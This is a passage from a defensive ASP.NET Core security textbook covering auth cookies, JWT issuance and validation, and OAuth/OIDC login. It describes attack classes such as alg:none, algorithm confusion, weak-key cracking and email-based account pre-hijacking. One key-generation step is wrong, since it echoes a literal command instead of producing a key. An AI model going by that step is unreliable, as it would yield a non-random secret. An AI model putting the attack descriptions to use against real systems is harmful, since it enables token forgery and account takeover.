6. `ExpireTimeSpan` — ticket lifetime: 2 hours. Risk economics: shorter = smaller window for stolen cookies, more re-logins. The value belongs to your threat model, but "24h" for a bank-grade app should trigger a question.
7. `SlidingExpiration = true` — each request *within* the window renews the expiry (a sliding window: active users never hit the wall; idle sessions expire 2h after their *last* activity, not their first). [ANALYST LENS] Sliding + long `ExpireTimeSpan` on sensitive apps = effectively-never-expiring sessions — a control drift often introduced by "users complained".
8. `LoginPath` — where anonymous users are redirected when they hit `[Authorize]` (with `?ReturnUrl=` — Chapter 6's `LocalRedirect` handles that safely).
9. `AccessDeniedPath` — authenticated-but-not-allowed (`403`-flavored, Chapter 2's 401/403 distinction rendered as UX).
10. `OnRedirectToLogin` — an **events hook**: cookie events let you customize behavior at defined moments (`OnSigningIn`, `OnValidatePrincipal`, `OnRedirectToLogin`, ...). This specific override: when an *API* route demands auth, do not `302` the client to an HTML login page (API clients cannot follow that meaningfully) — return bare `401`. Browsers get the redirect (10b). It is your first taste of policy that differs per audience, implemented as middleware events.

> [DANGER] The classic real-world review finding is a diff that looks innocent: someone "fixed a cookie warning" by setting `HttpOnly = false` because their JS "needed" the token. The correct pattern is: keep the cookie HttpOnly; if JS must call APIs, let the cookie authorize (with antiforgery for unsafe verbs) — never hand the token to page scripts.

### 7.6 Using Identity: `[Authorize]`, `User`, Claims — Line by Line

Protect a page. In `Views/Shared/_Layout.cshtml` you already have logout; make identity visible:

```html
@if (User.Identity?.IsAuthenticated == true)                       <!-- 1 -->
{
    <span class="navbar-text">Hello, @User.Identity.Name</span>
    <form method="post" asp-controller="Account" asp-action="Logout">
        <button type="submit" class="btn btn-link">Log out</button>
    </form>
}
else
{
    <a asp-controller="Account" asp-action="Register">Register</a>
    <a asp-controller="Account" asp-action="Login">Log in</a>
}
```

1. `User` — a property available in **every Razor view and every controller**: the `ClaimsPrincipal` rebuilt from the cookie (§ 7.4, step 4). `IsAuthenticated` checks for the presence of an authenticated identity — the source of truth everywhere in MVC.

And an actual gate — anywhere it matters, e.g. a profile page:

```csharp
using Microsoft.AspNetCore.Authorization;

[Authorize]                                          // 1
public class ProfileController : Controller
{
    public IActionResult Index()
    {
        string userId = _userManager.GetUserId(User); // 2
        return View();
    }
}
```

1. `[Authorize]` — the authorization filter: runs before the action; if `User` is unauthenticated → redirect to `LoginPath` (302 for browsers, 401 via our § 7.5 hook for API paths); if policies/roles are declared and fail → `AccessDeniedPath`. One attribute = one enforced gate at the framework level, not an `if` someone can forget in an action body. [RULE] Put `[Authorize]` at the **controller** level and explicitly `[AllowAnonymous]` the few public actions — the inverse pattern (default-open) is how private endpoints leak in real audits.
2. `GetUserId(User)` — fetches the user's identifier from claims — *without a database query*: everything needed came inside the cookie. Feel the architectural trade again: zero DB hits per request, paid for in "identity is up to cookie, up to expiry, up to signature".

### 7.7 The Attack Map for Cookies

| Attack | Defense you configured | Chapter |
|---|---|---|
| XSS steals `document.cookie` | `HttpOnly` | 13 |
| Sniffing on open Wi-Fi | `Secure` + TLS everywhere | 17 |
| CSRF forges a request riding your cookie | `SameSite=Lax` + antiforgery tokens | 14 |
| Cookie tampering ("give myself Admin") | Data Protection signature | 17 |
| Session fixation (attacker plants their cookie on your browser before login) | Identity issues a **fresh ticket at every sign-in** — the old value dies instantly | — |
| Endless stolen-cookie window | Short `ExpireTimeSpan`, deliberate sliding policy | 19 (alerting) |

### 7.8 Recap

- The auth cookie = encrypted, signed, chunked `ClaimsPrincipal`, trusted purely by cryptography; login is one `Set-Cookie`, logout is one expired `Set-Cookie`.
- `ConfigureApplicationCookie` is a defense checklist with property names: HttpOnly, Secure, SameSite, expiry policy, paths, and events hooks for per-audience behavior.
- `[Authorize]` at the controller level + `User` everywhere — enforce gates in the framework, not in scattered `if`s.
- Cookie defenses interlock with three later chapters (13, 14, 17) — which is why analysts audit them *together*.

**Next:** Chapter 8 moves to APIs, where cookies stop being the natural choice: you will mint, sign, validate, and attack JSON Web Tokens — and learn why the `Authorization: Bearer` header is both loved and feared.
## Chapter 8: JSON Web Tokens (JWT) for APIs

> "A JWT is a wristband at a festival: anyone can read the color, only the organizer can make one."

### 8.1 What You Will Learn in This Chapter

APIs serve programs, not browsers — and the industry's lingua franca for "who is calling" is the **JSON Web Token**. You will learn where JWTs came from, dissect one by hand (all three parts, decoded base64url character by character), configure the SecureShop API to issue and validate them, and then — deliberately — review the five ways real teams ship JWTs wrong. By the end, `Authorization: Bearer ...` will hold no mystery.

### 8.2 History: Why Sessions Didn't Survive the API Era

- **2005 — SAML 2.0:** XML-based security assertions let enterprises federate identity — powerful, but heavy (multi-kilobyte XML, XML-DSig complexity).
- **2010-2015 — JWT/JOSE:** the industry designed a compact, JSON-based token: RFC 7519 (JWT), with JWS (signing) and JWE (encryption) standards finalized 2015. A JWT is a few hundred bytes, URL-safe, trivially carried in a header.
- **Why it won:** mobile apps and SPAs don't handle cookies naturally; **microservices** want identity to cross service boundaries without every service querying a session database; **statelessness** *(word-by-word: the server keeps no per-client state; the credential itself carries the proof)* means any instance of the API can validate any client — scale-out for free.

The cost of that convenience — **you cannot revoke what you cannot track** — is the running theme of § 8.10.

### 8.3 Anatomy: Decoding a JWT by Hand

A token is three base64url *(base64 where `+`→`-`, `/`→`_`, and trailing `=` padding is dropped — URL-safe)* segments joined by dots:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiIxIiwiaXNzIjoiaHR0cHM6Ly9sb2NhbGhvc3Q6NzEwMiIsImF1ZCI6InNlY3VyZXNob3Atd2ViIiwiZXhwIjoxNzM1Njg5NjAwLCJyb2xlIjoiY3VzdG9tZXIifQ
.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

- **Part 1 — header**: decode `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → `{"alg":"HS256","typ":"JWT"}` — *"I am a JWT signed with HMAC-SHA256."* [CRITICAL] `alg` is attacker-supplied input in broken implementations — see § 8.10.
- **Part 2 — payload (claims)**: `"iss"` (issuer — who made it), `"sub"` (subject — *which identity*), `"aud"` (audience — *who may consume it), `"exp"` (expiry, seconds since epoch), `"jti"` (JWT ID — a random per-token identifier), plus custom claims like `"role"`. **The payload is only base64url — anyone can read it.** A JWT is *signed*, not encrypted (JWS vs. JWE, § 8.4) — never put a secret in it.
- **Part 3 — signature**: `HMACSHA256(base64url(header) + "." + base64url(payload), secretKey)` — a keyed fingerprint over parts 1+2. Change one character of the payload and the signature no longer matches.

> [LAB] Paste a real token (you mint one in a few paragraphs) into <https://jwt.io> or run `echo <part2> | base64 -d` in your shell. Read your own identity data. This is also the analyst move: **always decode client-supplied tokens during review** — you will find abandoned `isAdmin:true` claims from features nobody remembers.

### 8.4 JWS vs. JWE (One Paragraph, One Rule)

Signing (**JWS**) proves integrity and authenticity — the standard, default meaning of "JWT". Encryption (**JWE**) hides contents. Teams that assumed "signed = secret" have leaked PII inside tokens. [RULE] **JWT = readable by anyone, forgeable by no one.** Confidentiality is a separate, deliberate decision.

### 8.5 Setup: A Real Key, Kept Out of Git

A symmetric `HS256` key must be **random, ≥ 256 bits, and never committed**. Generate one:

```bash
dotnet user-secrets init --project src/SecureShop.Api
dotnet user-secrets list --project src/SecureShop.Api          # empty, as expected
```

Then one time (paste the output of the first command into the second):

```bash
echo "openssl rand -base64 32"
# or, in pure dotnet:
# System's random - see below
```

On macOS/Linux: `openssl rand -base64 32`. On Windows PowerShell:

```powershell
[Convert]::ToBase64String([Security.Cryptography.RandomNumberGenerator]::GetBytes(32))
```

`32 bytes = 256 bits` — exactly HS256's strength. `GetBytes` = cryptographically secure randomness (Chapter 5's rule: never `Random` for secrets). Now store it *outside the repo*:

```bash
dotnet user-secrets set "Jwt:Key" "PASTE_43_CHARACTERS_OF_BASE64_HERE" --project src/SecureShop.Api
dotnet user-secrets set "Jwt:Issuer" "https://localhost:7102"           --project src/SecureShop.Api
dotnet user-secrets set "Jwt:Audience" "secureshop-web"                  --project src/SecureShop.Api
```

**User secrets** *(a Development-only store — JSON under your OS user profile, outside the project folder)* merge into configuration transparently: `Configuration["Jwt:Key"]` finds it. Chapter 17 generalizes this to production (environment variables / Key Vault) — the rule stays: **code reads the key from configuration; the key never lives in code or Git.**

Install the API's auth package:

```bash
dotnet add src/SecureShop.Api package Microsoft.AspNetCore.Authentication.JwtBearer
```

### 8.6 Extending the User Store with Roles

For the API lab we extend Chapter 5's store minimally (production: the Identity tables from Chapter 6, or an external IdP from Chapter 9 — we discuss that trade in § 8.10). Update `AuthController`'s `RegisteredUser` and add a token service call — the full login flow follows in § 8.8:

```csharp
public class RegisteredUser(string username, string passwordHash, string role)   // 1
{
    public Guid Id { get; } = Guid.NewGuid();          // 2
    public string Username { get; } = username;
    public string PasswordHash { get; } = passwordHash;
    public string Role { get; } = role;
}
```

1. Records grow by adding constructor parameters — the primary constructor syntax carries them into properties.
2. `Guid.NewGuid()` — a random 128-bit identifier, generated with cryptographic randomness internally. [ANALYST LENS] Chapter 11 shows why GUID-vs-int IDs matter for enumeration; `sub` will carry this value.

### 8.7 The Token Service, Line by Line

Create `src/SecureShop.Api/Security/TokenService.cs`:

```csharp
using System.IdentityModel.Tokens.Jwt;                // 1
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

namespace SecureShop.Api.Security;

public class TokenService(IConfiguration config)      // 2
{
    public string Issue(Guid userId, string username, string role)
    {
        byte[] keyBytes = Convert.FromBase64String(config["Jwt:Key"]!);   // 3
        var key = new SymmetricSecurityKey(keyBytes);
        var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);   // 4

        Claim[] claims =                                                        // 5
        [
            new(JwtRegisteredClaimNames.Sub, userId.ToString()),                // 5a
            new(JwtRegisteredClaimNames.UniqueName, username),
            new(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),       // 5b
            new(ClaimTypes.Role, role)                                         // 5c
        ];

        var token = new JwtSecurityToken(                                       // 6
            issuer: config["Jwt:Issuer"],
            audience: config["Jwt:Audience"],
            claims: claims,
            notBefore: DateTime.UtcNow,                                        // 6a
            expires: DateTime.UtcNow.AddMinutes(15),                            // 6b
            signingCredentials: creds);

        return new JwtSecurityTokenHandler().WriteToken(token);                 // 7
    }
}
```

1. `System.IdentityModel.Tokens.Jwt` — the `JwtSecurityToken`/handler types (shipped transitively by the JwtBearer package). The newer alternative is `JsonWebTokenHandler` — same ideas, modern API; we teach the classic because you will meet it in the overwhelming majority of .NET codebases.
2. `TokenService(IConfiguration config)` — C# 12 **primary constructor**: parameters become injected fields. `IConfiguration` is the merged view of appsettings + user-secrets + (later) environment.
3. Read the key as bytes — `!` tells the compiler "I guarantee it exists" (config guarantees we set it). [DANGER] A missing key at startup should be loud: `if (keyBytes.Length < 32) throw new InvalidOperationException("Jwt:Key must be 256 bits");` — fail-closed at boot beats silently-weak keys in production. Add those two lines.
4. `SigningCredentials` — the choice *"this token is signed with HMAC-SHA256 using this key"* — becomes the token's `alg` header.
5. **Claims** — the same claims model as cookies (§ 7.3): identity as named facts:
   - **5a** `sub` — *subject*: the stable user identifier (`Guid`).
   - **5b** `jti` — a unique ID per issued token: the hook for a future deny-list (§ 8.10).
   - **5c** `ClaimTypes.Role` — a role claim; `JwtBearer` maps role claims so `[Authorize(Roles = "...")]` works out of the box (Chapter 10).
6. The token object — `notBefore`/`expires` become `nbf`/`exp` in the payload. **15 minutes, deliberately.** Short expiry is the mitigation for the revocation weakness we accept with stateless tokens (§ 8.10).
7. `WriteToken` — serializes header+payload and computes the signature: your first real JWT string.

### 8.8 Wiring Validation and the Protected Endpoint

**Registration in DI + validation policy** (API `Program.cs`):

```csharp
using System.Text;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using SecureShop.Api.Security;

builder.Services.AddScoped<TokenService>();                   // 1

builder.Services
    .AddAuthentication(JwtBearerDefaults.AuthenticationScheme) // 2
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,                            // 3
            ValidIssuer = builder.Configuration["Jwt:Issuer"],
            ValidateAudience = true,                          // 4
            ValidAudience = builder.Configuration["Jwt:Audience"],
            ValidateIssuerSigningKey = true,                   // 5
            IssuerSigningKey = new SymmetricSecurityKey(
                Convert.FromBase64String(builder.Configuration["Jwt:Key"]!)),
            ValidateLifetime = true,                           // 6
            ClockSkew = TimeSpan.FromMinutes(1),               // 7
            ValidAlgorithms = [SecurityAlgorithms.HmacSha256]  // 8
        };
    });

builder.Services.AddAuthorization();                          // 9

// ... after Build, in the pipeline:
app.UseAuthentication();                                      // 10
app.UseAuthorization();
```

1. Our token minter as a scoped service.
2. Register the **JWT bearer authentication handler**: "when a request carries `Authorization: Bearer <token>`, this handler validates it." `JwtBearerDefaults.AuthenticationScheme` — the scheme name, `"Bearer"` (Chapter 2 introduced that word: *whoever holds it, is it*).
3. `ValidateIssuer` — reject tokens minted by *other* identity providers. A token is only meaningful relative to *who issued it*.
4. `ValidateAudience` — reject tokens minted for *other systems*. Without this, a token stolen from (or leaked by) a *different* API that shares your key grants access here too — the classic **token confusion** bug.
5. `ValidateIssuerSigningKey = true` + our key — the cryptographic check: signature must match *this* key. The single non-negotiable flag.
6. `ValidateLifetime` — enforce `nbf`/`exp`.
7. `ClockSkew` — tolerance for clock differences between machines. **Default is 5 minutes**, meaning "expired" tokens keep working for up to 5 minutes. Tightened to 1 — [ANALYST LENS] exam question in real reviews: *"did you know expired tokens work for five more minutes by default?"*
8. `ValidAlgorithms` — hard-code the accepted algorithm. Defense-in-depth against the algorithm-confusion family (§ 8.10): the server never even *considers* a token claiming a different `alg`.
9. `AddAuthorization` — enables the authorization machinery (roles/policies in Chapter 10 use it).
10. Pipeline order — authentication, then authorization (Chapter 6's law, now with two handlers' worth of meaning).

**Login endpoint issues the token** — update `AuthController.Login`:

```csharp
private readonly TokenService _tokens;
public AuthController(TokenService tokens) => _tokens = tokens;

[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    bool known = _users.TryGetValue(request.Username.ToLowerInvariant(), out RegisteredUser? user);
    bool ok = known && Pbkdf2PasswordHasher.Verify(request.Password, user!.PasswordHash);
    if (!ok) return Unauthorized();                                     // 1

    string token = _tokens.Issue(user.Id, user.Username, user.Role);    // 2
    return Ok(new { token, expiresIn = 900 });                          // 3
}
```

1. Same generic-401 anti-enumeration as Chapter 5.
2. The authenticated identity becomes a signed, self-contained credential.
3. `expiresIn` — seconds (15 × 60): the client knows when to refresh (Chapter 9's refresh-token flow formalizes this).

**And finally a protected endpoint** — add to `ProductsController`:

```csharp
[HttpPost]
[Authorize(Roles = "admin")]                                 // 1
public ActionResult<Product> Create(Product product)
{
    product.Id = _products.Max(p => p.Id) + 1;
    _products.Add(product);
    return CreatedAtAction(nameof(GetById), new { id = product.Id }, product);   // 2
}
```

1. `[Authorize(Roles = "admin")]` — bearer handler validated the token → principal carries a `role` claim → the authorization filter checks it. Attack path without role: `403`. Without any token: `401`.
2. `CreatedAtAction` — `201` + `Location` header pointing to the new resource; REST done right (clients and scanners both behave better when contracts are).

> [LAB] The full loop, in the attacker's own language:
> ```bash
> curl -s -X POST https://localhost:7102/api/auth/register -H "Content-Type: application/json" \
>      -d '{"username":"analyst","password":"IReadChapters12To22!"}'
> curl -s -X POST https://localhost:7102/api/auth/login -H "Content-Type: application/json" \
>      -d '{"username":"analyst","password":"IReadChapters12To22!"}'
> # copy the token, then:
> curl -s -X POST https://localhost:7102/api/products \
>      -H "Authorization: Bearer PASTE_TOKEN" -H "Content-Type: application/json" \
>      -d '{"name":"Hacked Coffee","price":0.01}'
> ```
> Expect `403` — your token is valid, your *role* is not. Then decode the token at jwt.io and *watch your own `role: customer` claim* — you now see exactly why Chapter 10 will matter.

### 8.9 The Museum of JWT Mistakes (All Seen in Production)

- **`alg: none`** — the 2015-era bug class (CVE-2015-9235 et al.): libraries honored the token's *own* claim of "no signature needed." Any attacker set `"alg":"none"`, edited `role` to `admin`, and walked in. .NET's handler does not accept unsigned tokens — but set `ValidAlgorithms` (§ 8.8, line 8) anyway: **the server decides the algorithm, not the token.**
- **Algorithm confusion (RS256→HS256)** — services accepting both symmetric and asymmetric tokens have been tricked into treating an *RSA public key* as an HMAC secret — and public keys are, by definition, public. Defense: lock `ValidAlgorithms`; never mix families in one validation path.
- **Weak symmetric keys** — an `HS256` key like `"secret"` is crackable *offline* from one token: the attacker has header+payload+signature and can brute-force the key on a GPU farm without touching your server. That is why the key is 32 random bytes (§ 8.5). [ANALYST LENS] If a Git-trawling exercise finds `Jwt:Key` in a repo — assume compromise; secrets in history live forever (Chapter 17).
- **Validation flags quietly off** — `ValidateIssuer=false, ValidateAudience=false, ValidateLifetime=false` in "it-wouldn't-connect" debugging commits — shipped to prod, granting immortal cross-service super-tokens. Grep for exactly these three in every codebase; each instance needs a written justification.
- **Where the client keeps it** — `localStorage` is readable by any injected script (XSS ⇒ stolen session); a `HttpOnly` cookie protects the token but reintroduces CSRF (Chapter 14) and cookie-scoping rules. The engineering answer, in order: prefer **short-lived access tokens + refresh flow** (Chapter 9), keep access tokens in memory where possible, and treat "we keep tokens in localStorage" as a risk-accepted compromise you document — not a default.

### 8.10 The Revocation Problem (The Price of Statelessness)

A cookie session dies the moment the server forgets it; a JWT stays valid until `exp` **no matter what the server later decides** — because the server is *not consulted* on validity beyond cryptography. Fired an employee? Password changed? Token copied? — all of those tokens keep working for up to 15 minutes here. The stateless toolkit:

1. **Short access-token lifetime** (15 min here) — bounds any token's damage window.
2. **`jti` + deny-list** — remember revoked `jti`s in a fast store (Redis-class) until `exp` passes; check on request. You re-introduce state for exactly one lookup — the standard pragmatic hybrid.
3. **Refresh tokens** (Chapter 9) — long-lived *but server-side-tracked and revocable*; the client trades them for short access tokens.

### 8.11 Recap

- JWT = `header.payload.signature`, base64url, HMAC-signed (JWS): readable by anyone, forgeable by no one — secrets never inside.
- Server-side: lock issuer, audience, lifetime, signing key, and **algorithms**; tighten `ClockSkew`; fail loudly on bad key length.
- Client-side: bearer header; token in memory > cookie > localStorage, in descending order of resistance to XSS theft; document whatever you choose.
- Stateless convenience is paid for in revocation: short `exp`, optional `jti` deny-list, refresh flow.
- You have now built both halves of the identity world — cookie (Ch. 6-7) and token (Ch. 8). Chapter 9 connects them to the wider ecosystem: delegated identity with OAuth 2.0 and OpenID Connect.

**Next:** "Log in with Google/Apple/Microsoft" is not one API call — it is a protocol. Chapter 9 teaches the protocol, word by word, and wires external login into SecureShop.
## Chapter 9: OAuth 2.0 and OpenID Connect

> "Never let your app touch a password that isn't yours."

### 9.1 What You Will Learn in This Chapter

You have built local logins (passwords, cookies, tokens). This chapter teaches the industry's protocol for **delegated identity** — the machinery behind every "Log in with Google/Microsoft/Apple" button and behind service-to-service authorization in the cloud. We cover the history (what problem OAuth solved — and the password-sharing horror that preceded it), every role in the protocol with the exact words, the grant types (which are alive, which are dead), PKCE line by line, and then wire a real external login into SecureShop's MVC app. Finally: the OAuth-specific attacks your analyst's eye must catch.

### 9.2 History: From Password Sharing to a Protocol

- **The 2000s "password anti-pattern":** to let a contact-import tool read your webmail, sites asked you to **type your email password into a third-party form**. It normalized handing master credentials to strangers — a catastrophic pattern (credential storage by unknown parties, no revocation, no auditing).
- **2007 — OAuth 1.0** (Twitter, Ma.gnolia): first standardized "delegated authorization without password sharing" — signed requests, but the signature scheme was painful for developers.
- **2012 — OAuth 2.0 (RFC 6749):** simpler, HTTPS-based, extensible by design. The framework you use today.
- **2014 — OpenID Connect (OIDC):** OAuth 2.0 is *authorization* ("may this app read my calendar?"); it deliberately never standardized *who the user is*. OIDC layers **authentication** on top: a signed identity token with standard claims, a discovery document, a standard logout. **OAuth 2.0 = what the app may do. OIDC = who the user is.** Both, together, are what people loosely call "OAuth login".

### 9.3 The Four Roles, Word by Word

- **Resource Owner** — the entity that *owns the data*: usually the human user ("owner" of their profile, calendar, files).
- **Client** — the application *wanting access* (our MVC app, a mobile app). Beware the naming trap: here "client" is not the browser; it is *the application registered with the provider*.
- **Authorization Server** — the provider's engine: authenticates the user, collects consent, **issues tokens** (Google's, Azure AD's, Auth0's, Duende IdentityServer's...).
- **Resource Server** — the API holding the data, accepting tokens issued by the authorization server.

The flow at a glance — the **authorization code + PKCE** grant (the only interactive grant you should ship):

```
 Browser ────────────────────► Authorization Server
   "log in with SecureShop via Google"        user authenticates + consents
 Browser ◄──────────────────── 302 back to SecureShop with ?code=XYZ&state=abc
 SecureShop server ──────────► Authorization Server   POST code + verifier + client secret
                      ◄────── access_token, (refresh_token), id_token
 SecureShop server ──────────► Resource Server (Google APIs) with Bearer token
```

Word by word: **grant type** — *the recipe by which a client obtains a token*; **redirect/callback URI** — *the pre-registered URL the provider bounces the user back to* (registration is a control: an unregistered redirect URI should be refused); **consent** — *the user's explicit approval of the requested scopes*; **scope** — *a named, granular permission*: `openid` (identify the user), `profile`, `email`, `calendar.read` — scopes let you ask for the *least* you need (the OAuth embodiment of least privilege).

### 9.4 Grants: The Living and the Dead

| Grant | Use case | Verdict |
|---|---|---|
| **Authorization Code + PKCE** | Any user-facing app (web, SPA, mobile) | The standard. Use this. |
| **Client Credentials** | Machine→machine (our API calling another API; cron jobs) | Alive and correct — no user present, client authenticates itself with its own secret |
| Implicit (token returned in URL fragment) | Legacy SPAs | Dead — tokens in URLs leak via logs/history; deprecated by the IETF (2019+, OAuth 2.0 Security BCP) |
| Resource Owner Password | App collects *provider's* username/password itself | Dead — recreates the anti-pattern OAuth was invented to kill; removed in OAuth 2.1 |
| Device Code | TVs, consoles, CLIs | Alive — poll-based variant for input-poor devices |

### 9.5 PKCE, Line by Line (The Riddle Against Interception)

**PKCE** — "Proof of Key for Code Exchange", pronounced *pixie* — protects the authorization code in flight. The threat: on mobile/SPA redirects, a hostile app or log line could capture the `code` and redeem it before you do. PKCE binds the code to a secret only the *original* request holder knows:

1. Client generates a **code verifier**: 43-128 random URL-safe characters (`RandomNumberGenerator`-grade randomness).
2. Client sends `code_challenge = base64url(SHA256(verifier))` with the initial request — a *one-way* commitment.
3. Provider returns the `code` bound to that challenge.
4. Client redeems: `code` + **verifier** (the pre-image). Server hashes the verifier, compares to the challenge; a code thief (who only saw the URL) has no verifier and fails.

No secrets in the URL, no static client secret needed on the wire for public clients — yet redemption is still bound to the original session. This design — *commitment now, proof later* — is worth memorizing as an analyst: it appears in protocol after protocol.

### 9.6 OIDC: The Identity Layer

Three additions OAuth lacked:

1. **ID token** — a JWT whose *audience is the client* and whose payload is the user's identity (`sub`, `email`, `name`...) signed by the provider. Your app **verifies this JWT's signature** (Ch. 8 skills, reused) — never trust an unsigned or client-side-asserted identity.
2. **Discovery** — every OIDC provider publishes its configuration at `https://.../.well-known/openid-configuration`: token endpoint, issuer, supported scopes, key material (JWKS). Your middleware auto-loads it — that is why you configure only an `Authority`.
3. **Standard logout / session info** — beyond our scope, but the discovery document is where you find what your provider actually supports.

### 9.7 Wiring External Login into SecureShop (MVC)

Choose a provider you can register with freely — Google, Microsoft Entra ID, or Auth0 (all have free tiers; Duende IdentityServer is the .NET-native option, free for dev/test). Register an *application* at the provider to receive a **Client ID** (public name) and **Client Secret** (its password) and register a redirect URI: `https://localhost:7101/signin-oidc`. Install the handler:

```bash
dotnet add src/SecureShop.Web package Microsoft.AspNetCore.Authentication.OpenIdConnect
```

Configuration (Web `Program.cs`):

```csharp
using Microsoft.AspNetCore.Authentication.OpenIdConnect;
using Microsoft.IdentityModel.Protocols.OpenIdConnect;

builder.Services.AddAuthentication()                                   // 1
    .AddOpenIdConnect(options =>
    {
        options.SignInScheme = IdentityConstants.ApplicationScheme;    // 2
        options.Authority = "https://YOUR_PROVIDER_URL";                // 3
        options.ClientId = "YOUR_CLIENT_ID";
        options.ClientSecret = "YOUR_CLIENT_SECRET";                    // 4
        options.ResponseType = OpenIdConnectResponseType.Code;         // 5
        options.UsePkce = true;                                          // 5a
        options.Scope.Add("openid");
        options.Scope.Add("profile");
        options.Scope.Add("email");                                      // 6
        options.SaveTokens = true;                                       // 7
        options.GetClaimsFromUserInfoEndpoint = true;                    // 8
        options.CallbackPath = "/signin-oidc";                          // 9
        options.CorrelationCookie.SameSite = SameSiteMode.None;
        options.CorrelationCookie.SecurePolicy = CookieSecurePolicy.Always;   // 10
    });
```

1. `AddAuthentication()` with no arguments — *add* a provider to the existing Identity setup (which already registered the cookie scheme). Multiple schemes may coexist; Identity remains the local session.
2. `SignInScheme` — when the OIDC handler finishes validating the external login, *who turns it into the app's session?* Answer: Identity's application cookie (Chapter 7). This one line is the whole federation architecture: **external provider proves identity → app issues its own local cookie** — the app never stores the provider's tokens as its session.
3. `Authority` — the provider's base URL; the middleware fetches the discovery document and configures endpoints, issuer validation, and signing keys (JWKS) automatically.
4. Client credentials — [DANGER] these belong in **user-secrets / environment**, never appsettings-in-Git (Ch. 8's rule, one chapter later confirmed).
5. `ResponseType.Code` — the authorization-code flow only. Implicit and hybrid are dead (§ 9.4). `UsePkce = true` is the default in current templates — verify it anyway; analysts verify defaults.
6. Scopes — minimal by principle: identify + profile + email. [ANALYST LENS] Review requested scopes like permissions in a code review: every scope is a data grant, and `scope creep` (requesting everything "in case") is a routine finding.
7. `SaveTokens` — retain access/refresh tokens in the cookie (needed only if the app itself will call provider APIs). Cost: bigger cookie, longer-lived credentials. Off unless required.
8. `GetClaimsFromUserInfoEndpoint` — fetch the fuller profile from the provider's userinfo endpoint after sign-in, rather than cramming everything in the ID token.
9. `CallbackPath` — the redirect URI you registered; an exact-match contract with the provider.
10. The OIDC handshake needs its own tiny cookies (`CorrelationCookie`, nonce cookie) to be sendable cross-site during the redirect dance — hence `SameSite=None` + `Secure` (with a valid cert). A frequent local debugging landmine; keep it explicit.

Then challenge it — add a "Log in with provider" form/button posting to `ExternalLogin`, and in `AccountController`:

```csharp
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult ExternalLogin(string provider, string? returnUrl = null)   // 1
    => Challenge(new AuthenticationProperties { RedirectUri = "/Account/ExternalCallback" },
                 provider);

public async Task<IActionResult> ExternalCallback()                              // 2
{
    var result = await HttpContext.AuthenticateAsync(IdentityConstants.ExternalScheme);
    if (!result.Succeeded) return RedirectToAction("Login");

    var email = result.Principal.FindFirstValue(ClaimTypes.Email);              // 3
    var providerKey = result.Principal.FindFirstValue(ClaimTypes.NameIdentifier);

    // Find or create the local user, link the external login (AspNetUserLogins table,
    // Ch. 6 § 6.5), then sign in with the application cookie — same as Ch. 6.
    ...
}
```

1. `Challenge(...)` — the **challenge** *(word-by-word: "I challenge you to prove yourself")* is authentication middleware jargon for "redirect the caller to its identity provider". The named `provider` matches the OIDC scheme.
2. On return, the middleware has already validated the ID token (signature, issuer, audience, nonce); `AuthenticateAsync` hands you the resulting principal.
3. **Trust boundary moment:** the claims are real *because the provider signed them* — but the *account linkage* (mapping to a local user) is *your* logic and your next vulnerability class: [ANALYST LENS] audit the find-or-create path in every codebase. Classic finding: "if no local user matches this email, auto-create one" — an attacker who registers the *victim's email* at a sloppy provider then logs in as them (**account pre-hijacking via email trust**). Correct behavior: require verified emails, and treat unverified-provider emails as untrusted.

### 9.8 The OAuth Attack Catalog (What You Grep For)

- **Open redirect URIs** — providers/apps accepting `redirect_uri` mismatches or wildcards → codes leak to attacker domains. Check registered redirect URIs like fire exits.
- **Missing `state` / nonce** — `state` is the flow's CSRF token (ties the callback to *your* initiated login); `nonce` ties the ID token to the request. Handled by the middleware; verify nobody disabled them.
- **Client secrets in Git / front-end code** — grep repositories and bundles; a leaked confidential-client secret is total impersonation of your app.
- **Tokens in URLs** (implicit-flow leftovers, error redirects echoing tokens) — the Chapter 2 rule generalizes: URLs are logged everywhere.
- **Unvalidated ID tokens** (client-side login only, "the SPA verified the token itself") — verification must happen where decisions are made: the server.
- **Scope creep** — every scope in config is a permission grant; challenge each in review.

### 9.9 Recap

- OAuth 2.0 = delegated authorization; OIDC = authentication on top; authorization server issues, resource server accepts, client requests, owner consents.
- Ship: authorization code + PKCE (interactive) and client credentials (machine-to-machine). Never: implicit, password grant.
- Federation pattern: provider proves identity → app issues its own cookie → app controls sessions and revocation locally.
- Audit surfaces: redirect URIs, state/nonce, secrets hygiene, scopes, the find-or-create linkage logic, token storage.
- OAuth is the last *authentication* topic — Part III asks the question authentication cannot answer: **now that we know who you are — what are you allowed to do?**

**Next:** Chapter 10 builds the answer for SecureShop: roles, claims, and policies — and the day roles stop being enough.
# Part III: Authorization

> Authentication gets you a name. Authorization decides what that name is worth. Part III is about the question OWASP ranks #1 in real-world impact — **"may this identity do this thing, to this data?"** — and the two ways .NET answers it: the framework's roles/claims/policies machinery (Ch. 10), and the vigilance required when business rules — not attributes — hold the answer (Ch. 11, broken access control).

## Chapter 10: Roles, Claims, and Policies

> "Roles say what you are. Claims say what is true about you. Policies decide what that's worth."

### 10.1 What You Will Learn in This Chapter

The `[Authorize]` attribute you have used so far answers *only* "is someone logged in?". Real systems need finer questions: "is this an *admin*?", "is the user *over 18*?", "has their email been *verified*?", "do they belong to *tenant 42*?". ASP.NET Core answers all of these with a three-layer model — **roles**, **claims**, and **policies** — and you will build every layer into SecureShop: seed roles, protect the admin product pages, author a custom policy with a real handler class, line by line. You will also learn why string roles stop scaling, and why claims-plus-policies is the model every serious codebase converges on.

### 10.2 History: From Rigid Roles to Composable Policies

- **1990s — RBAC (Role-Based Access Control):** NIST formalized what systems had intuited: give permissions to *roles*, give *users* roles, and manage in groups instead of per-person. A warehouse of maintenance relief after the chaos of per-user permission lists — but RBAC's rigidity shows at scale: "Editor", "EditorWithApproval", "SeniorEditorWithApprovalButNotExport" — the role-explosion failure mode.
